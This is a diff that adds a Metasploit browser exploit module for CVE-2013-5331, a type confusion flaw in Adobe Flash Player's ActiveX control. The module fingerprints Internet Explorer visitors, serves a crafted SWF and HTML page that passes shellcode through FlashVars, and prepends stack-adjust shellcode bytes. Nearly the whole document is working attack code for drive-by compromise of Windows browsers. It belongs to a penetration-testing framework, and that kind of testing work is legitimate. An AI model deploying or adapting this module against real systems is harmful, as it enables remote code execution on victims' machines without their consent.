@@ -1,0 +1,131 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::BrowserExploitServer
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Adobe Flash Player Type Confusion Remote Code Execution",
+      'Description'    => %q{
+        This module exploits a type confusion vulnerability found in the ActiveX
+        component of Adobe Flash Player. This vulnerability was found exploited
+        in the wild in November 2013. This module has been tested successfully
+        on IE 6 to IE 10 with Flash 11.7, 11.8 and 11.9 prior to 11.9.900.170
+        over Windows XP SP3 and Windows 7 SP1.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Unknown', # Vulnerability discovery and exploit in the wild
+          'bannedit', # Exploit in the wild discoverer, analysis and reporting
+          'juan vazquez' # msf module
+        ],
+      'References'     =>
+        [
+          [ 'CVE', '2013-5331' ],
+          [ 'OSVDB', '100774'],
+          [ 'BID', '64199'],
+          [ 'URL', 'http://helpx.adobe.com/security/products/flash-player/apsb13-28.html' ],
+          [ 'URL', 'http://blog.malwaretracker.com/2014/01/cve-2013-5331-evaded-av-by-using.html' ]
+        ],
+      'Payload'        =>
+        {
+          'Space' => 2000,
+          'DisableNops' => true,
+          'PrependEncoder' => stack_adjust
+        },
+      'DefaultOptions'  =>
+        {
+          'InitialAutoRunScript' => 'migrate -f',
+          'Retries'              => false,
+          'EXITFUNC'             => "thread"
+        },
+      'Platform'       => 'win',
+      'BrowserRequirements' =>
+        {
+          :source  => /script|headers/i,
+          :clsid   => "{D27CDB6E-AE6D-11cf-96B8-444553540000}",
+          :method  => "LoadMovie",
+          :os_name => Msf::OperatingSystems::WINDOWS,
+          :ua_name => Msf::HttpClients::IE,
+          :flash   => lambda { |ver| ver =~ /^11\.[7|8|9]/ && ver < '11.9.900.170' }
+        },
+      'Targets'        =>
+        [
+          [ 'Automatic', {} ]
+        ],
+      'Privileged'     => false,
+      'DisclosureDate' => "Dec 10 2013",
+      'DefaultTarget'  => 0))
+  end
+
+  def exploit
+    @swf = create_swf
+    super
+  end
+
+  def stack_adjust
+    adjust = "\x64\xa1\x18\x00\x00\x00"  # mov eax, fs:[0x18 # get teb
+    adjust << "\x83\xC0\x08"             # add eax, byte 8 # get pointer to stacklimit
+    adjust << "\x8b\x20"                 # mov esp, [eax] # put esp at stacklimit
+    adjust << "\x81\xC4\x30\xF8\xFF\xFF" # add esp, -2000 # plus a little offset
+
+    adjust
+  end
+
+  def on_request_exploit(cli, request, target_info)
+    print_status("Request: #{request.uri}")
+
+    if request.uri =~ /\.swf$/
+      print_status("Sending SWF...")
+      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Pragma' => 'no-cache'})
+      return
+    end
+
+    print_status("Sending HTML...")
+    tag = retrieve_tag(cli, request)
+    profile = get_profile(tag)
+    profile[:tried] = false unless profile.nil? # to allow request the swf
+    print_status("showme the money")
+    send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})
+  end
+
+  def exploit_template(cli, target_info)
+    swf_random = "#{rand_text_alpha(4 + rand(3))}.swf"
+    flash_payload = ""
+    get_payload(cli,target_info).unpack("V*").each do |i|
+      flash_payload << "0x#{i.to_s(16)},"
+    end
+    flash_payload.gsub!(/,$/, "")
+
+
+    html_template = %Q|<html>
+    <body>
+    <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" width="1" height="1" />
+    <param name="movie" value="<%=swf_random%>" />
+    <param name="allowScriptAccess" value="always" />
+    <param name="FlashVars" value="sh=<%=flash_payload%>" />
+    <param name="Play" value="true" />
+    </object>
+    </body>
+    </html>
+    |
+
+    return html_template, binding()
+  end
+
+  def create_swf
+    path = ::File.join( Msf::Config.data_directory, "exploits", "CVE-2013-5331", "Exploit.swf" )
+    swf =  ::File.open(path, 'rb') { |f| swf = f.read }
+
+    swf
+  end
+
+end
